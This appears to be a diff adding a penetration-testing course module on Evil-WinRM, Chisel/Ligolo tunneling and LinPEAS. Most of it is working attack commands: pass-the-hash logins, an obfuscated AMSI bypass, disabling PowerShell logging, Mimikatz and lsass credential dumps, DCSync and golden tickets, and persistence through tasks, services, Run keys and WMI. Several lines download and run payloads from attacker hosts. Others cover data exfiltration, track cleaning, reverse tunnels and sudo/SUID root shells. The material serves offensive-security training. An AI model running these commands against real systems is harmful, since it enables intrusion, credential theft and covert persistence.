@@ -41190,3 +41190,1521 @@ cme smb TARGET -u Administrator -H NTHASH -x 'schtasks /create /tn "WindowsUpdat
 
 ---
 
+# Tool Mastery (Kali Linux Specific)
+
+Advanced tool proficiency accelerates post-exploitation workflows. This module covers Windows remote management, tunneling infrastructure, and automated privilege escalation enumeration with practical operational techniques.
+
+---
+
+## Evil-WinRM
+
+### Overview
+
+Evil-WinRM provides PowerShell remoting capabilities for penetration testing Windows systems. Implements WinRM protocol with built-in file transfer, PowerShell script execution, and modules loading for post-exploitation.
+
+### Installation and Verification
+
+**Check installation:**
+
+```bash
+evil-winrm --version
+which evil-winrm
+
+# Kali typically includes it by default
+```
+
+**Manual installation (if needed):**
+
+```bash
+# Ruby gem installation
+sudo gem install evil-winrm
+
+# From GitHub
+git clone https://github.com/Hackplayers/evil-winrm.git
+cd evil-winrm
+sudo gem install bundler
+bundle install
+```
+
+**Verify dependencies:**
+
+```bash
+# Required Ruby gems
+gem list | grep -E 'winrm|stringio|logger|fileutils'
+```
+
+### Basic Connection
+
+**Standard authentication:**
+
+```bash
+# Username and password
+evil-winrm -i 192.168.1.10 -u administrator -p 'Password123'
+
+# Domain user
+evil-winrm -i 192.168.1.10 -u 'DOMAIN\username' -p 'Password123'
+
+# Specify port (default 5985 HTTP, 5986 HTTPS)
+evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -P 5985
+```
+
+**SSL/TLS connection:**
+
+```bash
+# HTTPS (port 5986)
+evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -S
+
+# Custom SSL port
+evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -S -P 5986
+
+# Ignore SSL certificate validation
+evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -S -N
+```
+
+**Hash-based authentication (Pass-the-Hash):**
+
+```bash
+# NTLM hash authentication
+evil-winrm -i 192.168.1.10 -u administrator -H 'NTLM_HASH_HERE'
+
+# Example with actual hash format
+evil-winrm -i 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71'
+
+# Domain user with hash
+evil-winrm -i 192.168.1.10 -u 'DOMAIN\administrator' -H 'NTLM_HASH'
+```
+
+**Public key authentication:**
+
+```bash
+# Certificate-based authentication
+evil-winrm -i 192.168.1.10 -u username -c certificate.pem -k private_key.pem
+
+# SSL with client certificate
+evil-winrm -i 192.168.1.10 -u username -c cert.pem -k key.pem -S
+```
+
+### Connection Options
+
+**Realm specification:**
+
+```bash
+# Kerberos realm
+evil-winrm -i 192.168.1.10 -u username -p password -r DOMAIN.LOCAL
+```
+
+**Timeout and retries:**
+
+```bash
+# Custom timeout (seconds)
+evil-winrm -i 192.168.1.10 -u administrator -p password -t 30
+
+# Connection through proxy
+evil-winrm -i 192.168.1.10 -u administrator -p password --proxy http://127.0.0.1:8080
+```
+
+**Script and executable paths:**
+
+```bash
+# Specify scripts directory
+evil-winrm -i 192.168.1.10 -u administrator -p password -s /opt/powershell-scripts/
+
+# Specify executables directory
+evil-winrm -i 192.168.1.10 -u administrator -p password -e /opt/windows-binaries/
+
+# Both scripts and executables
+evil-winrm -i 192.168.1.10 -u administrator -p password -s /opt/scripts/ -e /opt/binaries/
+```
+
+### Built-in Commands
+
+**File operations:**
+
+```bash
+# Upload file to target
+*Evil-WinRM* PS C:\Users\Administrator> upload /root/payload.exe C:\Windows\Temp\payload.exe
+
+# Download file from target
+*Evil-WinRM* PS C:\Users\Administrator> download C:\Users\Administrator\Desktop\sensitive.txt /root/loot/
+
+# Upload with progress indicator
+*Evil-WinRM* PS C:\Users\Administrator> upload /root/large_file.zip
+
+# Download entire directory (not directly supported, use PowerShell zip first)
+*Evil-WinRM* PS C:\Users\Administrator> Compress-Archive -Path C:\Sensitive\ -DestinationPath C:\Temp\data.zip
+*Evil-WinRM* PS C:\Users\Administrator> download C:\Temp\data.zip
+```
+
+**Service management:**
+
+```bash
+# List services
+*Evil-WinRM* PS C:\> services
+
+# Specific service information
+*Evil-WinRM* PS C:\> Get-Service -Name "MSSQLSERVER"
+
+# Start/stop service
+*Evil-WinRM* PS C:\> Start-Service -Name "ServiceName"
+*Evil-WinRM* PS C:\> Stop-Service -Name "ServiceName"
+```
+
+**Menu system:**
+
+```bash
+# Show available Evil-WinRM commands
+*Evil-WinRM* PS C:\> menu
+
+# Output:
+# - Bypass-4MSI
+# - services
+# - upload
+# - download
+# - Invoke-Binary
+```
+
+### PowerShell Script Execution
+
+**Load and execute scripts:**
+
+```bash
+# From specified scripts directory (-s flag)
+*Evil-WinRM* PS C:\> Invoke-PowerView.ps1
+
+# Execute specific function from loaded script
+*Evil-WinRM* PS C:\> Get-NetUser
+
+# Load multiple scripts
+*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
+*Evil-WinRM* PS C:\> Invoke-Kerberoast.ps1
+```
+
+**Script directory structure:**
+
+```bash
+# Organize scripts before connecting
+mkdir -p /opt/powershell-scripts
+cd /opt/powershell-scripts
+
+# Download common scripts
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+wget https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1
+wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+
+# Connect with scripts directory
+evil-winrm -i 192.168.1.10 -u administrator -p password -s /opt/powershell-scripts/
+```
+
+**In-memory script execution:**
+
+```bash
+# Execute without writing to disk
+*Evil-WinRM* PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://attacker_ip/PowerView.ps1')
+
+# One-liner exploitation
+*Evil-WinRM* PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
+```
+
+### Binary Execution
+
+**Invoke-Binary command:**
+
+```bash
+# Execute binary from specified directory (-e flag)
+*Evil-WinRM* PS C:\> Invoke-Binary /opt/windows-binaries/mimikatz.exe
+
+# With arguments
+*Evil-WinRM* PS C:\> Invoke-Binary /opt/windows-binaries/mimikatz.exe "sekurlsa::logonpasswords"
+
+# Example executables directory setup
+mkdir -p /opt/windows-binaries
+cd /opt/windows-binaries
+
+# Common binaries
+wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+unzip mimikatz_trunk.zip
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip
+unzip SharpHound-v1.1.1.zip
+
+# Connect with executables directory
+evil-winrm -i 192.168.1.10 -u administrator -p password -e /opt/windows-binaries/
+```
+
+**In-memory binary execution:**
+
+```bash
+# Load binary into memory
+*Evil-WinRM* PS C:\> $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5/Rubeus.exe')
+*Evil-WinRM* PS C:\> $assembly = [System.Reflection.Assembly]::Load($data)
+*Evil-WinRM* PS C:\> [Rubeus.Program]::Main("kerberoast".Split())
+```
+
+### AMSI and Logging Bypass
+
+**Bypass-4MSI (AMSI bypass):**
+
+```bash
+# Evil-WinRM includes AMSI bypass
+*Evil-WinRM* PS C:\> Bypass-4MSI
+
+# Verify AMSI status
+*Evil-WinRM* PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+
+# Manual AMSI bypass alternatives
+*Evil-WinRM* PS C:\> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+```
+
+**Logging bypass techniques:**
+
+```bash
+# Disable PowerShell logging
+*Evil-WinRM* PS C:\> Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
+
+# Disable transcript logging
+*Evil-WinRM* PS C:\> Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0
+
+# Check current logging status
+*Evil-WinRM* PS C:\> Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\*" -ErrorAction SilentlyContinue
+```
+
+### Domain Enumeration
+
+**Active Directory reconnaissance:**
+
+```bash
+# Load PowerView
+*Evil-WinRM* PS C:\> Invoke-PowerView.ps1
+
+# Domain information
+*Evil-WinRM* PS C:\> Get-Domain
+*Evil-WinRM* PS C:\> Get-DomainController
+*Evil-WinRM* PS C:\> Get-Forest
+
+# User enumeration
+*Evil-WinRM* PS C:\> Get-NetUser
+*Evil-WinRM* PS C:\> Get-NetUser -SPN  # Kerberoastable accounts
+
+# Group enumeration
+*Evil-WinRM* PS C:\> Get-NetGroup
+*Evil-WinRM* PS C:\> Get-NetGroupMember "Domain Admins"
+
+# Computer enumeration
+*Evil-WinRM* PS C:\> Get-NetComputer
+*Evil-WinRM* PS C:\> Get-NetComputer -OperatingSystem "*Server*"
+
+# Share enumeration
+*Evil-WinRM* PS C:\> Invoke-ShareFinder
+*Evil-WinRM* PS C:\> Find-DomainShare -CheckShareAccess
+```
+
+**BloodHound data collection:**
+
+```bash
+# Load SharpHound
+*Evil-WinRM* PS C:\> upload /opt/windows-binaries/SharpHound.exe C:\Windows\Temp\SharpHound.exe
+
+# Run SharpHound
+*Evil-WinRM* PS C:\> cd C:\Windows\Temp
+*Evil-WinRM* PS C:\Windows\Temp> .\SharpHound.exe -c All
+
+# Download results
+*Evil-WinRM* PS C:\Windows\Temp> download C:\Windows\Temp\20240101120000_BloodHound.zip /root/bloodhound/
+
+# Alternative: In-memory SharpHound
+*Evil-WinRM* PS C:\> Invoke-Binary SharpHound.exe "-c All --outputdirectory C:\Windows\Temp"
+```
+
+### Credential Harvesting
+
+**Mimikatz execution:**
+
+```bash
+# Load Invoke-Mimikatz
+*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1
+
+# Dump credentials
+*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
+
+# Dump SAM
+*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"lsadump::sam"'
+
+# DCSync attack
+*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\krbtgt"'
+
+# Golden ticket
+*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /id:500"'
+```
+
+**Alternative credential dumping:**
+
+```bash
+# Using built-in tools
+*Evil-WinRM* PS C:\> reg save HKLM\SAM C:\Windows\Temp\sam.hive
+*Evil-WinRM* PS C:\> reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\sam.hive
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\system.hive
+
+# On attacker machine
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+# Process memory dump (lsass)
+*Evil-WinRM* PS C:\> Get-Process lsass | Out-Minidump -DumpFilePath C:\Windows\Temp\
+
+# Task Manager method
+*Evil-WinRM* PS C:\> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\lsass.dmp
+```
+
+### Kerberoasting
+
+**Rubeus execution:**
+
+```bash
+# Invoke-Binary for Rubeus
+*Evil-WinRM* PS C:\> Invoke-Binary Rubeus.exe "kerberoast /format:hashcat /outfile:C:\Windows\Temp\hashes.txt"
+
+# Download hashes
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\hashes.txt
+
+# Crack on attacker machine
+hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+**PowerShell Kerberoasting:**
+
+```bash
+# Request TGS tickets
+*Evil-WinRM* PS C:\> Add-Type -AssemblyName System.IdentityModel
+*Evil-WinRM* PS C:\> $users = Get-NetUser -SPN
+*Evil-WinRM* PS C:\> foreach ($user in $users) {New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $user.serviceprincipalname}
+
+# Export tickets
+*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"kerberos::list /export"'
+```
+
+### Persistence Mechanisms
+
+**Create scheduled task:**
+
+```bash
+# PowerShell reverse shell scheduled task
+*Evil-WinRM* PS C:\> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')`""
+*Evil-WinRM* PS C:\> $trigger = New-ScheduledTaskTrigger -Daily -At 9am
+*Evil-WinRM* PS C:\> Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
+```
+
+**Create service:**
+
+```bash
+# Backdoor service
+*Evil-WinRM* PS C:\> upload /root/payload.exe C:\Windows\Temp\service.exe
+*Evil-WinRM* PS C:\> New-Service -Name "WindowsHelper" -BinaryPathName "C:\Windows\Temp\service.exe" -StartupType Automatic
+*Evil-WinRM* PS C:\> Start-Service -Name "WindowsHelper"
+```
+
+**Registry persistence:**
+
+```bash
+# Run key persistence
+*Evil-WinRM* PS C:\> Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell.exe -NoP -W Hidden -Exec Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/beacon.ps1')`""
+
+# Verify
+*Evil-WinRM* PS C:\> Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+```
+
+**WMI event subscription:**
+
+```bash
+# Create WMI backdoor
+*Evil-WinRM* PS C:\> $FilterArgs = @{name='WindowsUpdate'; EventNameSpace='root\CimV2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
+*Evil-WinRM* PS C:\> $Filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property $FilterArgs
+
+*Evil-WinRM* PS C:\> $ConsumerArgs = @{name='WindowsUpdate'; CommandLineTemplate="powershell.exe -NoP -W Hidden -Exec Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')`""}
+*Evil-WinRM* PS C:\> $Consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
+
+*Evil-WinRM* PS C:\> $FilterToConsumerArgs = @{Filter = [Ref]$Filter; Consumer = [Ref]$Consumer}
+*Evil-WinRM* PS C:\> New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
+```
+
+### Lateral Movement
+
+**PSExec-like execution:**
+
+```bash
+# Create service on remote machine
+*Evil-WinRM* PS C:\> Invoke-Command -ComputerName TARGET-PC -ScriptBlock {
+    New-Service -Name "Deploy" -BinaryPathName "cmd.exe /c powershell -Command `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')`""
+    Start-Service -Name "Deploy"
+}
+
+# Clean up
+*Evil-WinRM* PS C:\> Invoke-Command -ComputerName TARGET-PC -ScriptBlock {Stop-Service -Name "Deploy"; Remove-Service -Name "Deploy"}
+```
+
+**Pass-the-Hash lateral movement:**
+
+```bash
+# From Evil-WinRM session, connect to another system
+*Evil-WinRM* PS C:\> $SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
+*Evil-WinRM* PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)
+*Evil-WinRM* PS C:\> Invoke-Command -ComputerName TARGET-PC -Credential $Cred -ScriptBlock {whoami}
+
+# Alternatively, exit and connect to new target with discovered hash
+# Exit current session
+*Evil-WinRM* PS C:\> exit
+
+# Connect to new target
+evil-winrm -i 192.168.1.20 -u administrator -H 'DISCOVERED_NTLM_HASH'
+```
+
+### File Transfer Optimization
+
+**Large file transfers:**
+
+```bash
+# Upload with compression
+*Evil-WinRM* PS C:\> upload /root/large_file.zip C:\Windows\Temp\
+
+# Download with compression
+*Evil-WinRM* PS C:\> Compress-Archive -Path C:\Sensitive\* -DestinationPath C:\Windows\Temp\loot.zip
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\loot.zip /root/loot/
+```
+
+**Alternative transfer methods:**
+
+```bash
+# SMB share
+*Evil-WinRM* PS C:\> net use \\10.10.14.5\share /user:attacker password
+*Evil-WinRM* PS C:\> copy C:\Sensitive\file.txt \\10.10.14.5\share\
+
+# Base64 encoding for small files
+*Evil-WinRM* PS C:\> $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.txt"))
+*Evil-WinRM* PS C:\> $content
+
+# On attacker, decode
+echo "BASE64_STRING" | base64 -d > file.txt
+```
+
+### Practical Workflows
+
+**Initial access workflow:**
+
+```bash
+# Step 1: Connect with credentials
+evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -s /opt/scripts/ -e /opt/binaries/
+
+# Step 2: Bypass AMSI
+*Evil-WinRM* PS C:\> Bypass-4MSI
+
+# Step 3: System information
+*Evil-WinRM* PS C:\> systeminfo
+*Evil-WinRM* PS C:\> whoami /all
+*Evil-WinRM* PS C:\> hostname
+
+# Step 4: Network enumeration
+*Evil-WinRM* PS C:\> ipconfig /all
+*Evil-WinRM* PS C:\> route print
+*Evil-WinRM* PS C:\> netstat -ano
+
+# Step 5: Privilege check
+*Evil-WinRM* PS C:\> whoami /priv
+*Evil-WinRM* PS C:\> net user administrator
+*Evil-WinRM* PS C:\> net localgroup administrators
+```
+
+**Domain compromise workflow:**
+
+```bash
+# Step 1: Load enumeration tools
+*Evil-WinRM* PS C:\> Invoke-PowerView.ps1
+
+# Step 2: Domain recon
+*Evil-WinRM* PS C:\> Get-Domain
+*Evil-WinRM* PS C:\> Get-DomainController
+*Evil-WinRM* PS C:\> Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+# Step 3: Kerberoasting
+*Evil-WinRM* PS C:\> Invoke-Binary Rubeus.exe "kerberoast /outfile:C:\Windows\Temp\kerberoast.txt"
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\kerberoast.txt
+
+# Step 4: Credential dumping
+*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
+
+# Step 5: Lateral movement with harvested credentials
+evil-winrm -i 192.168.1.20 -u 'DOMAIN\dadmin' -H 'HARVESTED_HASH'
+```
+
+**Data exfiltration workflow:**
+
+```bash
+# Step 1: Identify sensitive data
+*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\ -Include *.pdf,*.doc,*.xlsx,*.txt -Recurse -ErrorAction SilentlyContinue
+
+# Step 2: Search for keywords
+*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.doc,*.xlsx | Select-String -Pattern "password","confidential","secret"
+
+# Step 3: Compress findings
+*Evil-WinRM* PS C:\> Compress-Archive -Path C:\Users\Admin\Documents\Sensitive -DestinationPath C:\Windows\Temp\data.zip
+
+# Step 4: Exfiltrate
+*Evil-WinRM* PS C:\> download C:\Windows\Temp\data.zip /root/exfil/
+
+# Step 5: Clean tracks
+*Evil-WinRM* PS C:\> Remove-Item C:\Windows\Temp\data.zip -Force
+```
+
+### Troubleshooting
+
+**Connection issues:**
+
+```bash
+# Verify WinRM is enabled on target
+nmap -p 5985,5986 192.168.1.10
+
+# Test WinRM connectivity
+Test-WSMan -ComputerName 192.168.1.10
+
+# Enable WinRM (if you have access)
+Enable-PSRemoting -Force
+Set-Item wsman:\localhost\client\trustedhosts *
+
+# Check firewall rules
+netsh advfirewall firewall show rule name="Windows Remote Management (HTTP-In)"
+```
+
+**Authentication errors:**
+
+```bash
+# NTLM authentication issues
+# Ensure hash format is correct: LM:NTLM or just NTLM
+evil-winrm -i 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH'
+
+# Domain authentication format
+evil-winrm -i 192.168.1.10 -u 'DOMAIN.LOCAL\user' -p 'password'
+evil-winrm -i 192.168.1.10 -u 'user@domain.local' -p 'password'
+
+# Certificate issues with SSL
+evil-winrm -i 192.168.1.10 -u administrator -p 'password' -S -N
+```
+
+**Performance optimization:**
+
+```bash
+# Increase timeout for slow connections
+evil-winrm -i 192.168.1.10 -u administrator -p 'password' -t 60
+
+# Reduce verbosity
+evil-winrm -i 192.168.1.10 -u administrator -p 'password' -q
+```
+
+---
+
+## Chisel/Ligolo (Revisited with Integration Focus)
+
+### Overview
+
+Previously covered in Lateral Movement module. This section focuses on integration with Evil-WinRM and practical deployment scenarios specific to Windows environments.
+
+### Chisel with Evil-WinRM
+
+**Deploy Chisel via Evil-WinRM:**
+
+```bash
+# Step 1: Upload Chisel Windows binary
+*Evil-WinRM* PS C:\> upload /opt/chisel/chisel_windows_amd64.exe C:\Windows\Temp\chisel.exe
+
+# Step 2: Start Chisel server on attacker
+chisel server -p 8000 --reverse
+
+# Step 3: Connect from Windows target
+*Evil-WinRM* PS C:\> cd C:\Windows\Temp
+*Evil-WinRM* PS C:\Windows\Temp> .\chisel.exe client ATTACKER_IP:8000 R:socks
+
+# Step 4: Configure proxychains on attacker
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+
+# Step 5: Access internal network
+proxychains4 evil-winrm -i 172.16.0.10 -u administrator -p 'password'
+```
+
+**Chisel for double-hop scenarios:**
+
+```bash
+# Topology: Attacker → DMZ (Windows) → Internal (Windows)
+
+# On attacker
+chisel server -p 8000 --reverse
+
+# On DMZ Windows (via Evil-WinRM)
+*Evil-WinRM* PS C:\> upload /opt/chisel/chisel_windows_amd64.exe C:\Windows\Temp\chisel.exe
+*Evil-WinRM* PS C:\> Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\chisel.exe" -ArgumentList "client ATTACKER_IP:8000 R:socks"
+
+# Access internal network from attacker
+proxychains4 nmap -sT 172.16.0.0/24
+proxychains4 evil-winrm -i 172.16.0.50 -u administrator -H 'HASH'
+```
+
+**Persistent Chisel tunnel:**
+
+```bash
+# Create scheduled task for Chisel
+*Evil-WinRM* PS C:\> upload /opt/chisel/chisel_windows_amd64.exe C:\Windows\System32\chisel.exe
+
+*Evil-WinRM* PS C:\> $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\chisel.exe" -Argument "client ATTACKER_IP:8000 R:socks"
+*Evil-WinRM* PS C:\> $trigger = New-ScheduledTaskTrigger -AtStartup
+*Evil-WinRM* PS C:\> Register-ScheduledTask -TaskName "SystemChisel" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
+```
+
+### Ligolo-ng with Evil-WinRM
+
+**Deploy Ligolo agent via Evil-WinRM:**
+
+```bash
+# Step 1: Start Ligolo proxy on attacker
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ./proxy -selfcert
+
+# Step 2: Upload agent to Windows target
+*Evil-WinRM* PS C:\> upload /opt/ligolo-ng/agent.exe C:\Windows\Temp\agent.exe
+
+# Step 3: Execute agent
+*Evil-WinRM* PS C:\> cd C:\Windows\Temp
+*Evil-WinRM* PS C:\Windows\Temp> Start-Process -NoNewWindow -FilePath ".\agent.exe" -ArgumentList "-connect ATTACKER_IP:11601 -ignore-cert"
+
+# Step 4: In Ligolo proxy interface
+ligolo-ng » session
+? Specify a session: 1
+[Agent : hostname] » ifconfig
+[Agent : hostname] » start
+
+# Step 5: Add route on attacker
+sudo ip route add 172.16.0.0/24 dev ligolo
+
+# Step 6: Direct access to internal network
+evil-winrm -i 172.16.0.10 -u administrator -p 'password'
+nmap -sS 172.16.0.0/24
+```
+
+**Ligolo port forwarding for RDP:**
+
+```bash
+# In Ligolo session
+[Agent : hostname] » listener_add --addr 0.0.0.0:3389 --to 172.16.0.10:3389
+
+# On attacker
+rdesktop localhost:3389
+xfreerdp /u:administrator /p:password /v:localhost:3389
+```
+
+### Combined Tunneling Strategies
+
+**Scenario: External → DMZ Windows → Internal Windows Network**
+
+```bash
+# Method 1: Evil-WinRM → Ligolo → Internal
+# Step 1: Connect to DMZ
+evil-winrm -i 10.10.10.50 -u administrator -p 'password'
+
+# Step 2: Deploy Ligolo
+*Evil-WinRM* PS C:\> upload agent.exe C:\Windows\Temp\agent.exe
+*Evil-WinRM* PS C:\Windows\Temp> .\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
+
+# Step 3: Route and access
+sudo ip route add 172.16.0.0/24 dev ligolo
+evil-winrm -i 172.16.0.10 -u administrator -H 'HASH'
+
+# Method 2: Chisel SOCKS chain
+# DMZ server
+*Evil-WinRM* PS C:\> .\chisel.exe client ATTACKER_IP:8000 R:9050:socks
+
+# Access through SOCKS proxy
+proxychains4 evil-winrm -i 172.16.0.10 -u administrator -p 'password'
+```
+
+**Port forwarding through Evil-WinRM + Chisel:**
+```bash
+# Forward internal RDP through DMZ
+*Evil-WinRM* PS C:\> upload chisel.exe C:\Windows\Temp\chisel.exe
+*Evil-WinRM* PS C:\> Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\chisel.exe" -ArgumentList "client ATTACKER_IP:8000 R:3389:172.16.0.10:3389"
+
+# On attacker (Chisel server running)
+# RDP directly to localhost
+xfreerdp /u:administrator /p:password /v:localhost:3389
+```
+
+---
+
+## LinPEAS/WinPEAS
+
+### Overview
+
+PEAS (Privilege Escalation Awesome Scripts) automate enumeration for privilege escalation vectors on Linux (LinPEAS) and Windows (WinPEAS) systems. Identify misconfigurations, vulnerable services, and privilege escalation paths.
+
+---
+
+## LinPEAS
+
+### Installation and Deployment
+
+**Download LinPEAS:**
+```bash
+# Latest version
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+# Specific version
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20240101/linpeas.sh
+
+# Make executable
+chmod +x linpeas.sh
+
+# Fat version (includes full enumeration)
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_fat.sh
+```
+
+**Transfer methods:**
+```bash
+# HTTP server on attacker
+python3 -m http.server 8000
+
+# On target - download and execute
+curl http://ATTACKER_IP:8000/linpeas.sh | bash
+wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
+
+# Direct execution without writing to disk
+curl http://ATTACKER_IP:8000/linpeas.sh | bash
+
+# Base64 encoding (no wget/curl)
+# On attacker
+base64 -w 0 linpeas.sh > linpeas_b64.txt
+
+# On target
+echo "BASE64_CONTENT" | base64 -d | bash
+
+# SCP transfer
+scp linpeas.sh user@target:/tmp/
+
+# Via Evil-WinRM to Linux target through Windows pivot
+# (Upload to Windows, then use Windows to transfer)
+```
+
+**Run from memory:**
+```bash
+# Direct execution via curl
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Using bash process substitution
+bash <(curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)
+```
+
+### Basic Execution
+
+**Standard execution:**
+```bash
+# Basic run
+./linpeas.sh
+
+# With output redirection
+./linpeas.sh > linpeas_output.txt
+
+# Both stdout and stderr
+./linpeas.sh 2>&1 | tee linpeas_output.txt
+
+# Quiet mode (less output)
+./linpeas.sh -q
+
+# Verbose mode
+./linpeas.sh -v
+```
+
+**Output options:**
+```bash
+# No colors (for file output)
+./linpeas.sh -o no_colors
+
+# Only specific checks
+./linpeas.sh -a
+
+# Fast mode (skip time-consuming checks)
+./linpeas.sh -f
+
+# SuperFast mode (minimal checks)
+./linpeas.sh -s
+```
+
+### Search Parameters
+
+**Filter specific checks:**
+```bash
+# Search for specific keyword
+./linpeas.sh -s password
+
+# Multiple keywords
+./linpeas.sh -s "password,config,key"
+
+# Regular expression search
+./linpeas.sh -r "pass.*"
+
+# Look for SUID binaries only
+./linpeas.sh | grep -A 10 "SUID"
+
+# Find writable files
+./linpeas.sh | grep -A 10 "Writable"
+```
+
+**Level-based execution:**
+```bash
+# Level 0: Fast scan (minimal checks)
+./linpeas.sh -L 0
+
+# Level 1: Normal scan (default)
+./linpeas.sh -L 1
+
+# Level 2: Thorough scan
+./linpeas.sh -L 2
+
+# Full enumeration
+./linpeas.sh -a
+```
+
+### Output Interpretation
+
+**Color coding:**
+```
+RED/YELLOW: 95% chance of privilege escalation
+RED: Should be investigated
+LIGHT_YELLOW: Interesting finding
+LIGHT_MAGENTA: Possible credential
+GREEN: Common finding, less likely exploitable
+BLUE: Additional information
+```
+
+**Key sections to review:**
+
+**1. System Information:**
+```bash
+# OS version and kernel
+# Check for kernel exploits
+uname -a
+cat /etc/os-release
+
+# Look for Dirty COW, overlayfs, etc. vulnerabilities
+```
+
+**2. SUID Binaries:**
+```bash
+# LinPEAS highlights unusual SUID binaries
+# Cross-reference with GTFOBins
+# Example output:
+# -rwsr-xr-x 1 root root 8392 Sep  1  2020 /usr/bin/find
+
+# Exploit find SUID
+find . -exec /bin/bash -p \;
+```
+
+**3. Sudo Configuration:**
+```bash
+# Sudo permissions
+# Look for NOPASSWD entries
+# Check for vulnerable sudo versions (CVE-2021-3156)
+
+# Example finding:
+# User can run: (ALL) NOPASSWD: /usr/bin/vim
+
+# Exploit
+sudo vim -c ':!/bin/sh'
+```
+
+**4. Writable Paths:**
+```bash
+# Writable files and directories
